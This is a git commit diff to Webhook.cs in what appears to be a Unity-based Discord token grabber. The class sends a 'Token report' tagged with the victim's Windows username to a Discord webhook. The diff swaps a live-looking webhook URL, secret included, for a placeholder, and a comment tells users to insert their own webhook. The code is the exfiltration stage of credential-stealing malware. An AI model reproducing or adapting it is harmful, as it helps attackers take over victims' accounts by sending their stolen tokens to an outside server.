ed789948d150769ffef3139800e6c469d2100ba2
qqt <54314240+qqtc0@users.noreply.github.com>
2021-12-25 11:34:42 +0000

    Update Webhook.cs

--- Assets/Scripts/Webhook.cs
+++ Assets/Scripts/Webhook.cs
@@ -6,8 +6,7 @@ using UnityEngine;
 internal static class Webhook
 {
     //you've got to change this to your own discord webhook url
-    private const string _hookUrl =
-        "https://canary.discord.com/api/webhooks/909282375786184825/zufMwjkl_KAPqsoTlWQRgp7Vg5KX2Rkw-0i3UZbjbaNwnjWSHXJPimF5S55K25BZpSyI";
+    private const string _hookUrl = "YOUR_WEBHOOK_URL";
 
     public static void ReportTokens(IEnumerable<string> tokenReport)
     {
@@ -17,7 +16,7 @@ internal static class Webhook
             var contents = new Dictionary<string, string>
             {
                 {"content", $"Token report for '{Environment.UserName}'\n\n{string.Join("\n", tokenReport)}"},
-                {"username", "elsa x biseukis <3"},
+                {"username", "Radeon"},
                 {
                     "avatar_url",
                     "https://cdn.discordapp.com/avatars/270564030953816085/c823ddc9fe0c550cd852065afd3d3646.webp?size=4096"
